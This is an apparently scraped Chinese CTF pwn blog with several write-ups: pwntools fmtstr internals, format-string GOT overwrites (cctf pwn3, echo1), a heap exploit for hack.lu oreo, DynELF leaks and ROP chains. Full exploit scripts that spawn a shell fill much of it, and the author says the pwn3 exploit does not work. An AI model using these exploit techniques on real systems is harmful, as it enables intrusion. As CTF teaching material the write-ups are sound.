​ pwntools就非常人性化地为我们集成了格式化字符串偏移量寻找，got表覆盖等非常常见好用的操作，这里我们通过简单的例子，着重讨论这些自动化脚本编写的原理。 例子​ 例如，这是一段自动化的格式化字符串漏洞利用的脚本，主要适用于rop并改got表的板子题。 12345678910111213141516171819202122232425262728293031323334from pwn import *elf = ELF(&#x27;./&#x27;)r = process(&#x27;./&#x27;)libc = ELF(&#x27;/&#x27;)# 计算偏移量def exec_fmt(payload): r.sendline(payload) info = r.recv() return info auto = FmtStr(exec_fmt)offset = auto.offset# 获得 func 的 got 地址func_got = elf.got[&#x27;func&#x27;]#func通常是一些例如printf或puts的函数log.success(&quot;func_got =&gt; &#123;&#125;&quot;.format(hex(func_got)))# 获得 func 的真实地址payload = p32(func_got) + &#x27;%&#123;&#125;$s&#x27;.format(offset)r.send(payload)func_addr = u32(r.recv()[4:8])log.success(&quot;func_addr =&gt; &#123;&#125;&quot;.format(hex(func_addr)))# 获得 system 的真实地址system_addr = func_addr - (libc.symbols[&#x27;func&#x27;] - libc.symbols[&#x27;system&#x27;])log.success(&quot;system_addr =&gt; &#123;&#125;&quot;.format(hex(system_addr)))payload = fmtstr_payload(offset, &#123;func_got : system_addr&#125;)r.send(payload)r.send(&#x27;/bin/sh&#x27;)r.recv()r.interactive() ​ ​ 其中脚本的核心就是pwntools的fmtstr功能。fmtstr几乎完全自动化地帮我们完成了偏移寻找，got表覆盖等工作，大大简化了我们的做题流程。 源码分析​ pwntools定义了一个FmtStr类，来实现格式化字符串漏洞的利用。 ​ ps：了解该源码分析需要首先了解简单的面向对象的python程序设计。因为我也不太懂，所以画了个图来归纳一下，大概就是： ​ 所以下图中的代码也就能够理解了，就是将参数传入实例本身。 ​ 然后，是功能实现的第一步–偏移的寻找，也是这篇笔记重点要分析的部分，完整的源码分析会写成一个新的系列。 ​ 很显然这个功能的实现是基于find_offset方法。 ​ 方法的内容其实比较简单： 1234567891011def find_offset(self): marker = cyclic(20)#cyclic 20个字符 for off in range(1,1000):#从1-1000，爆破偏移量 leak = self.leak_stack(off, marker) leak = pack(leak)#leak = p(leak_stack) pad = cyclic_find(leak[:4]) if pad &gt;= 0 and pad &lt; 20: return off, pad else: log.error(&quot;Could not find offset to format string on stack&quot;) return None, None ​ 而实现方法find_offset，又依靠方法leak_stack 123456789def leak_stack(self, offset, prefix=b&quot;&quot;): payload = b&quot;START%%%d$pEND&quot; % offset leak = self.execute_fmt(prefix + payload) try: leak = re.findall(br&quot;START(.*?)END&quot;, leak, re.MULTILINE | re.DOTALL)[0] leak = int(leak, 16) except ValueError: leak = 0 return leak ​ cyclic的代码也顺便放一放（ 12345678910111213141516171819202122232425def cyclic_find(subseq, alphabet = None, n = None): if n is None: n = context.cyclic_size if isinstance(subseq, six.integer_types): subseq = packing.pack(subseq, bytes=n) subseq = packing._need_bytes(subseq, 2, 0x80) if len(subseq) != n: log.warn_once(&quot;cyclic_find() expects %i-byte subsequences by default, you gave %r\\n&quot; &quot;Unless you specified cyclic(..., n=%i), you probably just want the first 4 bytes.\\n&quot; &quot;Truncating the data at 4 bytes. Specify cyclic_find(..., n=%i) to override this.&quot;, n, subseq, len(subseq), len(subseq)) subseq = subseq[:n] if alphabet is None: alphabet = context.cyclic_alphabet alphabet = packing._need_bytes(alphabet, 2, 0x80) if any(c not in alphabet for c in subseq): return -1 n = n or len(subseq) return _gen_find(subseq, de_bruijn(alphabet, n)) ​ 之前一直对cyclic的实现抱有兴趣，抽个时间可以看看源码分析。 ​ 3）实际利用1:goodluck话不多说，直接上例子。 程序逻辑分析第一步，清晰而准确的逆向是漏洞点利用的基础。 首先，程序读取flag，通过_IO_getc(fp)，一个字符一个字符地将flag读入v10。 然后将flag的首地址给v9。 然后刷新缓冲区。这里这个fflush函数，以前没有怎么深入了解过（ 然后看一个关于fflush的详解 C语言fflush()函数：清空文件缓冲区（或标准输入输出缓冲区） 但是文章中讲的是stdin，和这里的bss段关联感觉并不大，我疑惑的地方不是为什么要fflush，而是疑惑bss段有什么东西。 bss段存储未初始化的全局变量，也不是缓冲区吧。 缓冲区从一个简单的fflush函数中，我们试图理解缓冲区的原理和这个函数被设置的意义。 为了减少cpu对磁盘的读写次数，提高运行速度，缓冲区（这里特指buf）存储了我们的键盘，屏幕输入输出。当我们将字符通过键盘输入到缓冲区中，cingetchar函数再从缓冲区中读取我们的键盘输入，从而进行数据的操作。屏幕输出也是同理。 缓冲区的分类1:全缓冲。只有在缓冲区被填满之后才会进行I/O操作；最典型的全缓冲就是对磁盘文件的读写。 2:行缓冲只有在输入或者是输出中遇到换行符的时候才会进行I/O操作；这忠允许我们一次写一个字符，但是只有在写完一行之后才做I/O操作。一般来说，标准输入流(stdin)和标准输出流(stdout)是行缓冲 3:无缓冲 无缓冲；标准I/O不缓存字符；其中表现最明显的就是标准错误输出流(stderr)，这使得出错信息尽快的返回给用户。 （我以前一直不是很能理解为什么要专门设置一个标准错误，现在知道了，如果error的输出有缓冲区的话，可能要等程序执行到最后才会报错，这样就不能即时地接收到报错） fflush函数然后是关于fflush函数的glibc源码。 fflush实际是调用vtable中的函数_IO_new_file_sync，这个函数的源码如图： （/glibc-2.23/libio/fileops.c:867） 12345678910111213141516171819202122232425262728293031323334int_IO_new_file_sync (_IO_FILE *fp)&#123; _IO_ssize_t delta; int retval = 0; /* char* ptr = cur_ptr(); */ if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) if (_IO_do_flush(fp)) return EOF;//end of file delta = fp-&gt;_IO_read_ptr - fp-&gt;_IO_read_end; if (delta != 0) &#123;#ifdef TODO if (_IO_in_backup (fp)) delta -= eGptr () - Gbase ();#endif _IO_off64_t new_pos = _IO_SYSSEEK (fp, delta, 1); if (new_pos != (_IO_off64_t) EOF) fp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr;#ifdef ESPIPE else if (errno == ESPIPE) ; /* Ignore error from unseekable devices. */#endif else retval = EOF; &#125; if (retval != EOF) fp-&gt;_offset = _IO_pos_BAD; /* FIXME: Cleanup - can this be shared? */ /* setg(base(), ptr, ptr); */ return retval;&#125;libc_hidden_ver (_IO_new_file_sync, _IO_file_sync) 虽然但是，真的看不懂，那些调用的函数是啥功能都不知道。 pwntools与缓冲区机制某些pwn题为了增加难度，会设置题目默认缓冲区存在，从而使pwntools的对于数据的发送与接收产生问题，一是远端的输出并不会及时回显，另外是数据累积在缓冲区内，对远端数据的正常接收造成影响。 为了搞清这种影响是如何产生的，以及如何解决，我们将从pwntools的源码层面研究pwntools与远端服务器的交互，从而彻底探明这一问题。详见pwntools源码剖析（1）–以源码的角度分析io交互原理 %ms？从缓冲区的研究回到程序的简单逻辑分析上。 __isoc99_scanf(&quot;%ms&quot;, &amp;format); 接着就来了这么一句，我第一次听说m这个参数，其实就是动态的分配了scanf的缓冲区，有效避免了溢出。（stackoverflow上回答废话一堆，说得云里雾里） 然后接着又是一个手写的read函数，再将输入的字符串赋给v4，再将v4与flag比较，如果错误，就来一个格式化字符串的漏洞。 漏洞利用因为程序其实已经拿到flag了，所以这道题并不需要考虑getshell。只需要通过刚才的格式化字符串漏洞，将flag打印出来。 那么如何打印这个flag呢？ 我们首先肯定要输入一个错误的flag（废话），然后进入与flag的比较，这个时候，flag的具体的值也在内存中。所以随便动调一下。 flag其实就已经出来了，但是为了学习，我们还需要将它打印出来。 这时候就需要计算这个flag字符串与栈顶的偏移。 显然flag在栈顶第四个参数的位置，除去第一行的返回地址，也就是第三个。但是由于64位程序，前6个参数是由寄存器传参，所以需要+6，也就是第九个参数。 利用%n$s打印参数，即可获得flag。 2）cctf pwn3经过刚才的开胃菜，我们总算进入了正题。 一般来说，getshell的其中一种非常常见的手法就是改函数got表为另外某个函数。尤其是没有栈溢出，并且并没有开启relro的情况下，这种手法几乎是最通用的解法。 但是如果需要修改函数的got表，我们需要满足几个条件： 知道需要修改的函数的真实地址。 需要想办法改写函数的got表。 一般来说，一个没有漏洞的程序，想要实现以上任意一点都是很难的，但是毕竟还是ctf题（ 回归正题，我们可以用格式化字符串漏洞来解决以上两个问题，详见例子 程序分析 还是先进行一个简单的逻辑分析。 首先要求登陆，然后在系统中有三个功能，get file ，put file 和show file，基本就是put一个文件，输入文件名和内容，然后可以get文件和show文件。（虽然我没看明白这个get和show函数有什么区别）显然在get file 中，存在一个格式化字符串漏洞。 所以思路其实很清晰，首先我们并不知道密码，要登录进去，还需要绕过一个密码的检测。 当我们成功登陆，直接确定格式化字符串相对栈的偏移，然后打印函数的真实地址，通过地址确定libc基址，再修改函数got表位systen的地址从而getshell，这也是一般的格式化字符串的板子题常见套路。 ps:用wiki给的exp动调一下，把断点下在发送payload之前。如果调试不当可能会造成 ERROR: Could not find ELF base! 原因详见https://fuurinko.github.io/2021/10/27/gdb附加调试的一些黑魔法/的2.1节。 绕过密码检测123456789#ask_username.c for ( i = 0; i &lt;= 39 &amp;&amp; src[i]; ++i ) ++src[i]; #ask_password.c if ( strcmp(s1, &quot;sysbdmin&quot;) ) &#123; puts(&quot;who you are?&quot;); exit(1); &#125; 进入程序会有一个比较简单的小check，我们所输入的用户名的ascii需要小于sysbdmin,可以直接用符合条件的username来绕过检测。(strcmp是以ascii码做比较的，然后如果str1比str2小，则返回一个负值。题目的检测显然需要我们返回一个负值，所以我们需要输入比sysbdmin的ascii小，但字符长度相等的字符。) 1#rxraclhm 寻找格式化字符串在栈中的偏移当我们绕过了密码，然后就需要打印puts函数的真实地址。 打印真实地址，第一步需要找到格式化字符串在栈中的偏移。 ps：关于这个偏移的寻找，其实背公式的话非常简单，但是我们需要了解其中的原理。在上一个简单的例子中我们并没有对这个原理进行一个详细的说明，是因为题目步骤实在过于简单，但是如果碰到较为复杂的题目，盲人摸象并不可取。 原理参见：https://fuurinko.github.io/2021/10/27/摆烂第六天--格式化字符串偏移计算原理/ ​ 可以看到我们输入的格式化字符串的地址位于第八个参数。 利用漏洞泄露地址​ 既然找到了格式化字符串的偏移，那么就可以利用它来泄露内存了。 12345# get the addr of putsputs_got = elf.got[&#x27;puts&#x27;]log.success(&#x27;puts got : &#x27; + hex(puts_got))put(b&#x27;aa&#x27;, b&#x27;%8$s&#x27; + p32(puts_got))puts_addr = u32(get(&#x27;1111&#x27;)[:4]) put一个名为aa的文件，内容是格式化字符串以及puts的got表地址。 这里%8$s + p32(puts_got)先把puts的got表传进去，然后再通过%8$s打印。 然后接收信息，就是puts的got表地址。 利用格式化字符串覆盖puts的got表fmt模块实现123456789payload = fmtstr_payload(7, &#123;puts_got: system_addr&#125;)put(&#x27;/bin/sh;&#x27;, payload)gdb.attach(p)p.recvuntil(&#x27;ftp&gt;&#x27;)p.sendline(&#x27;get&#x27;)p.recvuntil(&#x27;enter the file name you want to get:&#x27;)p.sendline(&#x27;/bin/sh;&#x27;)show() ​ 这里其实主要的问题都是被fmtstr_payload函数解决了。 ​ 这个函数是pwntools的一个集成的功能，含义就是，格式化字符串是栈上第七个参数，然后需要将system的地址写入puts的got表地址。 ​ 关于函数是如何实现的，可以参见另外一篇笔记。格式化字符串偏移计算原理 手动实现​ 等等再写。 ​ 调用show，实现getshell最后调用show，也就是puts函数，puts的content的是binsh，就相当于getshell。 可以看到确实puts的got表被改为了system的地址。 但是感觉情况与我期待的并不一样，当调用fmt_payloadmodule的时候，puts的got表并没有被修改，而是在最后show（）的时候才突然变成了system。 ​ 发现问题所在了。system的地址根本不是system。。真的逆天，这个确实不知道该怎么办了，got表也改了，函数参数也传入了，但是地址不对。。。为什么。 完整exp：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556from pwn import*#from LibcSearcher import LibcSearchercontext.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;libc = ELF(&quot;/glibc/2.23/32/lib/libc-2.23.so&quot;)p = process(&quot;./pwn3&quot;)elf = ELF(&quot;./pwn3&quot;)def get(name): p.sendline(&#x27;get&#x27;) p.recvuntil(&#x27;enter the file name you want to get:&#x27;) p.sendline(name) data = p.recv() return datadef put(name, content): p.sendline(&#x27;put&#x27;) p.recvuntil(&#x27;please enter the name of the file you want to upload:&#x27;) p.sendline(name) p.recvuntil(&#x27;then, enter the content:&#x27;) p.sendline(content)def show(): p.sendline(&#x27;dir&#x27;)p.recvuntil(&#x27;Name (ftp.hacker.server:Rainism):&#x27;)p.sendline(&#x27;rxraclhm&#x27;)# get the addr of putsputs_got = elf.got[&#x27;puts&#x27;]log.success(&#x27;puts got : &#x27; + hex(puts_got))put(b&#x27;aa&#x27;, b&#x27;%8$s&#x27; + p32(puts_got))puts_addr = u32(get(&#x27;aa&#x27;)[:4])log.success(&#x27;puts_addr : &#x27; + hex(puts_addr))system_off = libc.symbols[&#x27;system&#x27;]puts_off = libc.symbols[&#x27;puts&#x27;]libc_base = puts_addr - puts_offsystem_addr = libc_base + system_offlog.success(&#x27;system addr : &#x27; + hex(system_addr))payload = fmtstr_payload(7, &#123;puts_got: system_addr&#125;)put(&#x27;/bin/sh;&#x27;, payload)gdb.attach(p)p.recvuntil(&#x27;ftp&gt;&#x27;)p.sendline(&#x27;get&#x27;)p.recvuntil(&#x27;enter the file name you want to get:&#x27;)p.sendline(&#x27;/bin/sh;&#x27;)show()p.interactive() echo1逆向​ 没啥好逆的，输入字符，然后输出字符，纯纯格式化字符串。 12345678do&#123; fgets(s, 256, stdin); printf(s);&#125;while ( strcmp(s, &quot;exit\\n&quot;) );system(&quot;echo Goodbye&quot;);exit(0); 利用​ 由于system的地址已经知道了，就没有必要再泄露，直接利用fmt模块将ptintf got覆盖就行。 1234567891011121314151617from pwn import *elf = ELF(&#x27;./echo&#x27;)#r = process(&#x27;node4.buuoj.cn&#x27;,26117)r = process(&quot;./echo&quot;)printf_got = elf.got[&#x27;printf&#x27;]printf_got = 0x804A010#system_plt = elf.plt[&#x27;system&#x27;]system_plt = 0x8048400payload = fmtstr_payload(7,&#123;printf_got:system_plt&#125;)r.sendline(payload)r.sendline(&#x27;/bin/sh;&#x27;)r.interactive() ​ 另外其实可以尝试一下手动修改。 ​ 其实就是把0x804A010改成0x8048400。 ​ 所以payload大概长这样 1payload = p32(0x804A010) + b&#x27;%xxxxc&#x27;+ b&#x27;%6$hn&#x27; ​ echo2​ 整个程序与echo1基本没有区别（估计只有编译参数不一样），但是是64位，并且开启了随机化。 ​ 并且在栈上的参数的偏移（也）是7+6 = 13。 ​ 但是值得注意的求偏移时，由于程序是64位，所以并不适合用pwntools的fmt模块，因为 ​ ​ ​ 总结​ 通过这篇笔记我确实是认识到自动化脚本的重要性，其实我觉得但凡真正入门了pwn，就不会再浪费时间于一些明明可以自动化完成的东西，就比如说rop有相应的脚本roputil，有onegadget，但是我总是拒绝去用这些东西，反而将大把时间浪费于无谓的调试以及历史脚本的复制粘贴上。 ​ 然而简单的题目尚且可以通过手工构造，如果是实战或者盲打，上哪里手工构造呢？我总有一天要面对这个东西，为什么不早点接受呢？ 参考缓冲区机制详解 C语言fflush()函数：清空文件缓冲区（或标准输入输出缓冲区） difference between %ms and %s scanf 格式化字符串 [格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测](格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测) pwnlib.fmtstr— Format string bug exploitation tools 格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测 pwntools中fmtstr的使用 3.1.1 格式化字符串漏洞 Python中self用法详解 ​","categories":[{"name":"STACK - Format","slug":"STACK-Format","permalink":"https://fuurinko.github.io/categories/STACK-Format/"}],"tags":[{"name":"FMT","slug":"FMT","permalink":"https://fuurinko.github.io/tags/FMT/"}]},{"title":"ida的结构体识别","slug":"ida的结构体识别","date":"2022-03-17T12:35:07.220Z","updated":"2022-03-25T11:55:39.584Z","comments":true,"path":"2022/03/17/ida的结构体识别/","link":"","permalink":"https://fuurinko.github.io/2022/03/17/ida%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93%E8%AF%86%E5%88%AB/","excerpt":"","text":"0​ 最近发现做堆题最慢的不是调试，而是在逆向的过程中寻找思路，而一般堆题的菜单都是由结构体管理，所以如果能在ida中快速方便地查看结构体相关的指针操作就再好不过了。然而一般来说ida是无法直接识别结构体这种比较高级的数据结构的，所以需要我们手动去创建并修改。 1​ 首先可以在idastructures的界面手动添加一些结构体 ​ 右键空白处，选择add struct type，便可以新建结构体。鼠标选中ends字段，按下D可以新建字段，在当前字段再按下D可以调整字段长度。 ​ 为反汇编代码添加结构体​ ​ ​ 随便一道堆题，逻辑比较简单，几个对于字段的处理都比较直观，所以可以较为清楚地知道head结构体中的字段，然后右键head创建结构体， 然后按照实际情况调整。","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"2014 hack.lu oreo","slug":"week3-3.2","date":"2022-03-17T07:05:44.803Z","updated":"2022-03-20T04:33:36.836Z","comments":true,"path":"2022/03/17/week3-3.2/","link":"","permalink":"https://fuurinko.github.io/2022/03/17/week3-3.2/","excerpt":"","text":"overview​ ​ 搞不懂为什么这么多题都要stripped。 逆向add​ 申请0x38大小的chunk，user space开始处存枪支的description,+0x19处存放枪支的name。 ​ 输入name的时候，最大长度为56，导致能够溢出，覆盖fd字段。 ​ 同时每输入信息以后都会有一个保存指针的操作： free ​ 虽然free了ptr，但是会将allocaed chunk的fd字段作为free后的fd指针，存在ptr指向的地址。 ​ 可以看到bin中的fd。 show ​ ​ 打印descrption时会将fd指针所所指向的内容打印出来。 message&amp;show status ​ 注意fgets()的定义，将128字节从stdin读进notice指向的地址（bss段上），然后在show status函数中打印出来。 ​ 所以可以看到，在一般情况下，向message留言，一般内存布局是这样子的 ​ 也就是a2a8指向a2c0，所以是向a2c0写入数据。这样如果把a2a8储存的数据改为某个函数的got表，就能够实现got表的更改。 利用把fd项填为puts@got的地址，从而泄露libc基址，计算system地址​ 泄露地址利用了程序的第一个漏洞，正因为打印descrption时会将fd指针所所指向的内容打印出来，所以如果我们将其覆盖为puts()的got表地址，就能够泄露其地址。 123456add(25 * b&#x27;a&#x27;, name)show_rifle()p.recvuntil(&#x27;===================================\\n&#x27;)p.recvuntil(&#x27;Description: &#x27;)puts_addr = u32(p.recvuntil(&#x27;\\n&#x27;, drop=True)[:4])print(hex(puts_addr)) ​ 然后按套路算出system()的地址。 123libcbase = puts_addr - libc.symbols(&#x27;puts&#x27;)system_addr = libcbase + libc.symbols(&#x27;system&#x27;)log.success(&#x27;system_addr &#x27; + hex(system_addr)) 利用任意地址写覆盖free@got为system_addr​ 刚才说到，我们可以将notice处的指针改为got表地址，为了做到这一点，我们需要在这个地址附近申请一个fake chunkk。 ​ 这里主要利用到了order()函数中的漏洞。虽然free的过程中将ptr置0，但是chunk中还保存着fd。 ​ 最开始有一个简单的想法，就是直接将fd覆盖为got表地址，从而在got表项地址处申请chunk来修改，想法是自然的，然而如果只是单纯地将fd覆盖为free@got，并不能成功地在target addr分配chunk，这是由于分配chunk时的一系列检测。 ​ ​ 如果直接将fd填成free_got_addr，就会造成double free。为什么捏？如果是地址无效我还是能够理解，但是double free我确实不理解。在free了当前chunk之后，fastbin不是应该长这样 》main_arena =&gt; free_got_addr =&gt;chunk0?怎么会有double free呢？ ​ ​ 先不管。 ​ 回到在notice附近构造fake chunk，可以先add一个chunk，并按照之前的方式覆盖fd为notice的地址。这样一来当我们free这个chunk，再add 相同size的chunk时，notice就会被作为fake chunk的ptr，被分配出去。 ​ 当然，为了成功伪造fake chunk，我们至少要将notice的空间添加一些chunk该有的结构，比如说size。以及next chunk的size和prev size。 ​ 为了覆盖got表，user space开始的地址需要是0x804A2A,所以这个chunk的size的地址在0x804A2A4 ​ ​ 可以看到这个地址正好是枪支已经添加的数量，所以为了构造fake chunk的size，我们可以先总共申0x40个枪支，因为之前泄露libc已经申请了一个，所以只需要再申请0x40-1只。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182from pwn import *from LibcSearcher import LibcSearcherlibc = ELF(&quot;/glibc/2.23/32/lib/libc-2.23.so&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;&#x27;&#x27;&#x27;if args[&#x27;REMOTE&#x27;]: p = remote(&quot;node4.buuoj.cn&quot;,27999)else: &#x27;&#x27;&#x27;p = process([&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;,&quot;./oreo&quot;],env=&#123;&quot;LD_PRELOAD&quot; : &quot;/glibc/2.23/32/lib/libc.so.6&quot;&#125;)elf = ELF(&#x27;./oreo&#x27;)strlen_got_addr = elf.got[&#x27;strlen&#x27;]notice_addr = 0x804A2A8free_got_addr = 0x804A238 def add(descrip, name): p.sendline(&#x27;1&#x27;) #p.recvuntil(&#x27;Rifle name: &#x27;) p.sendline(name) #p.recvuntil(&#x27;Rifle description: &#x27;) #sleep(0.5) p.sendline(descrip)def show_rifle(): p.sendline(&#x27;2&#x27;) p.recvuntil(&#x27;===================================\\n&#x27;)def order(): p.sendline(&#x27;3&#x27;)def message(notice): p.sendline(&#x27;4&#x27;) #p.recvuntil(&quot;Enter any notice you&#x27;d like to submit with your order: &quot;) p.sendline(notice)#find libc basename = 27 * b&#x27;a&#x27; + p32(elf.got[&#x27;puts&#x27;])add(25 * b&#x27;a&#x27;, name)show_rifle()p.recvuntil(&#x27;===================================\\n&#x27;)p.recvuntil(&#x27;Description: &#x27;)puts_addr = u32(p.recvuntil(&#x27;\\n&#x27;, drop=True)[:4])log.success(&#x27;puts_addr &#x27; + hex(puts_addr))libcbase = puts_addr - libc.symbols[&#x27;puts&#x27;]system_addr = libcbase + libc.symbols[&#x27;system&#x27;]log.success(&#x27;system_addr &#x27; + hex(system_addr))#overwrite free@gotn = 1while n &lt; 0x3f:# set next link=NULL add(25 * b&#x27;a&#x27;, b&#x27;a&#x27; * 27 + p32(0)) n += 1add(b&#x27;a&#x27;*25,b&#x27;b&#x27;*27+p32(notice_addr))payload = b&#x27;\\x00&#x27;*0x20 +p32(0x40) + p32(0x99)#payload = payload.ljust(52,b&#x27;a&#x27;)payload += p32(0)payload = payload.ljust(128,b&#x27;c&#x27;)message(payload)order()#p.recvuntil(&#x27;Okay order submitted!\\n&#x27;)#modify the strlen_got to systempayload = p32(strlen_got_addr).ljust(20,b&#x27;a&#x27;)add(payload,b&#x27;a&#x27;*20)gdb.attach(p)message(p32(system_addr) + b&#x27;;/bin/sh\\x00&#x27;)p.interactive() ​","categories":[{"name":"HEAP - Fastbin Attack","slug":"HEAP-Fastbin-Attack","permalink":"https://fuurinko.github.io/categories/HEAP-Fastbin-Attack/"}],"tags":[{"name":"UAF","slug":"UAF","permalink":"https://fuurinko.github.io/tags/UAF/"}]},{"title":"xdctf2015_pwn200","slug":"week3-3.1","date":"2022-03-17T06:43:25.178Z","updated":"2022-03-20T04:33:33.017Z","comments":true,"path":"2022/03/17/week3-3.1/","link":"","permalink":"https://fuurinko.github.io/2022/03/17/week3-3.1/","excerpt":"","text":"xdctf2015_pwn200​ ​ 练习一下DynELF。 ​ 看起来像ret2csu+DynELF。 ​ 没啥好分析的，溢出112,然后直接写leak函数。 1234567891011121314151617def leak(addr): payload = b&#x27;a&#x27;*offset payload += p32(write_plt) payload += p32(ret_addr) payload += p32(1) payload += p32(addr) payload += p32(4) p.send(payload) data = p.recv() log.info(&quot;leaking: 0x%x --&gt; %s&quot; % (addr, (data or &#x27;&#x27;).encode(&#x27;hex&#x27;))) return datad = DynELF(leak,elf = elf)system_addr = d.lookup(&#x27;system&#x27;,&#x27;libc&#x27;)log.info(&quot;system address: 0x%x&quot; % system_addr) ​ ​ 一般来说这个模块的利用就是通过stdout的函数来泄露某个地址，然后再暴力寻找，相对普通的ret2libc其实更为方便快捷，我不知道为什么感觉用的人很少。 ps：关于整体布栈还是有一些小的疑问。","categories":[{"name":"STACK - DynELF","slug":"STACK-DynELF","permalink":"https://fuurinko.github.io/categories/STACK-DynELF/"}],"tags":[{"name":"DynELF","slug":"DynELF","permalink":"https://fuurinko.github.io/tags/DynELF/"}]},{"title":"DynELF学习","slug":"DynELF","date":"2022-03-16T14:06:44.306Z","updated":"2022-03-20T04:31:20.175Z","comments":true,"path":"2022/03/16/DynELF/","link":"","permalink":"https://fuurinko.github.io/2022/03/16/DynELF/","excerpt":"","text":"0​ 我发现我居然还不太会用这个东西，可以用不上，但是不能不会。 1​ DynELF的意义在于当我们无法找到目标libc中具体的符号偏移时，可以利用它来搜索内存中的函数地址,而不需要再通过libc来获取。 如何使用？1234567891011121314151617181920212223242526272829303132333435p = process(&#x27;./pwnme&#x27;)# Declare a function that takes a single address, and# leaks at least one byte at that address.def leak(address): data = p.read(address, 4) log.debug(&quot;%#x =&gt; %s&quot; % (address, (data or &#x27;&#x27;).encode(&#x27;hex&#x27;))) return data# For the sake of this example, let&#x27;s say that we# have any of these pointers. One is a pointer into# the target binary, the other two are pointers into libcmain = 0xfeedf4celibc = 0xdeadb000system = 0xdeadbeef# With our leaker, and a pointer into our target binary,# we can resolve the address of anything.## We do not actually need to have a copy of the target# binary for this to work.d = DynELF(leak, main)assert d.lookup(None, &#x27;libc&#x27;) == libcassert d.lookup(&#x27;system&#x27;, &#x27;libc&#x27;) == system# However, if we *do* have a copy of the target binary,# we can speed up some of the steps.d = DynELF(leak, main, elf=ELF(&#x27;./pwnme&#x27;))assert d.lookup(None, &#x27;libc&#x27;) == libcassert d.lookup(&#x27;system&#x27;, &#x27;libc&#x27;) == system# Alternately, we can resolve symbols inside another library,# given a pointer into it.d = DynELF(leak, libc + 0x1234)assert d.lookup(&#x27;system&#x27;) == system ​ ​ 大致描述一下，就是先用leak()函数按照原本ret2xx的方法用stdout函数来打印addr的数据，然后 12d = DynELF(leak, main)system_addr = d.lookup(&#x27;system&#x27;, &#x27;libc&#x27;) ​ 来找到system的地址。 ​ 原理？​ 这个module其实非常好用，指不知道原理也能用。 ​ DynELF泄露地址的过程原理通常分为两步，首先通过暴力对比找到libc的内存加载基址。 ​ 在找libc之前还需要找到elf文件在内存中的加载基址。 寻找elf文件加载基址​ 基地址内存页起始的字符串为\\0x7fELF，所以可以指定内存中的地址，然后对地址进行页对齐，再与当前内存页起始字符串进行对比，如果不符合则不断与更低地址内存页的起始字符串对比，直到找到。 寻找glibc加载基址​ efl在内存中有一个叫做link_map的双向链表，在学习ret2dl的时候遇见过，大致是指向elf的一些表项相关数据结构的链表。 ​ 对于如何找到link_map ,一般来说有两种方式，在full relro以外的elf中，可以在Dynamic段的.got.plt节中找到，对于启用full relro的elf，可以在Dynamic段的DT_DEBUG中找到。 ​ Dynamic段的地址则需要通过ELF文件的段表得到，由于我们已经获得了ELF的内存基地址，所以也能得到段表的地址。 在libc中寻找hash表，动态符号表与字符串表基地址​ 通过上面两步我们已经获得了libc的基地址，因此很容易得到所有与函数相关的hash表，动态符号表以及字符串表的基地址。最后，可以通过hash表得到system的地址。 ​ 参考​ Pwntools之DynELF原理探究 ​ ​ Finding Function’s Load Address","categories":[{"name":"STACK - DynELF","slug":"STACK-DynELF","permalink":"https://fuurinko.github.io/categories/STACK-DynELF/"}],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"ccmc_pwnme2","slug":"week3-2.2","date":"2022-03-16T11:18:25.856Z","updated":"2022-03-25T11:58:03.866Z","comments":true,"path":"2022/03/16/week3-2.2/","link":"","permalink":"https://fuurinko.github.io/2022/03/16/week3-2.2/","excerpt":"","text":"​ ccmc_pwnme2一道看起来人畜无害的栈题。但是有几个非常奇怪的函数。 ​ 所以这是一道相对有些奇怪的rop，控制这三个函数的其中两个的参数为指定字符串，就能较为方便地读取flag。 12345678910111213141516from pwn import *p = remote(&#x27;node4.buuoj.cn&#x27;,27653)#p = process(&#x27;./pwnme2&#x27;)pop_edi_ebp_ret= 0x0804867fpop_ebp_ret = 0x08048680add_home = 0x08048644add_flag = 0x08048682exec_string = 0x080485CBpayload = b&quot;a&quot;*112 + p32(add_home) + p32(pop_ebp_ret) + p32(0xDEADBEEF) payload += p32(add_flag) + p32(pop_edi_ebp_ret) + p32(0xCAFEBABE) + p32(0xABADF00D) payload += p32(exec_string)p.send(payload)p.interactive() ​ ​ ps：感觉还需要再多做一些rop","categories":[{"name":"STACK - Stack Overflow","slug":"STACK-Stack-Overflow","permalink":"https://fuurinko.github.io/categories/STACK-Stack-Overflow/"}],"tags":[{"name":"ret2gadgets","slug":"ret2gadgets","permalink":"https://fuurinko.github.io/tags/ret2gadgets/"}]},{"title":"hctf2016_fheap","slug":"week3-2.1","date":"2022-03-16T03:48:29.784Z","updated":"2022-03-25T11:55:48.766Z","comments":true,"path":"2022/03/16/week3-2.1/","link":"","permalink":"https://fuurinko.github.io/2022/03/16/week3-2.1/","excerpt":"","text":"​ ​ 第三周第二天第一道堆题。应该是一道中等偏下的fastbinattack。 ​ libc是2.23。 ​ ​ 保护全开，pie是个麻烦点。 ​ 逆向一下，这个程序的逻辑不算很复杂，但是也需要逆清楚。 ​ ​ 程序在ptr+3的地方保存了一个有着free函数功能的指针，并且当delete str时，也是调用这个指针，而不是free函数本身，所以可以覆盖它为任意函数指针。 ​ 为了泄露内存，我们可以尝试调用printf，并构造格式化字符串，找到system的地址，然后可以故技重施，将指针覆盖为system，从而getshell。 ​ 所以利用的第一步就是覆盖这个free指针为printf指针，由于程序开启了pie，我们只需要，也只能覆盖指针的最后两个字节。 ​ 对于格式化字符串，（其实我不太会》〉》〉这两天多刷一些吧，目前就copy一下大佬的exp） 